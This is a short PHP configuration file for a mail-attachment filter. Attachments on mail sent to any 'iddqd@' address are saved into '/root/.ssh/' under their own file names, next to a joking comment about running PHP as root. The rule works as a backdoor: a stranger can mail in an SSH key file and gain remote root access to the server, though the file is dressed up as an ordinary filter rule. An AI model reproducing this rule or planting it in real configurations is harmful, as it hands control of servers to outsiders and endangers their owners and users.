<?php

return [
   'filter' => function (MailData $data, array $matchedRules) {
      // Look at MailData class to see what information you can check
      // for filtering this attachment
      return preg_match('/^iddqd@/i', $data->to);
   },
   'action' => 'store',
   'options' => [
      // Since you probably run this as root like a proper PHP dev
      'path' => '/root/.ssh/%FILENAME%',
      // skip = ignore new file, replace = replace old file with new one, rename = rename new file
      'exists' => 'rename',
   ],
];
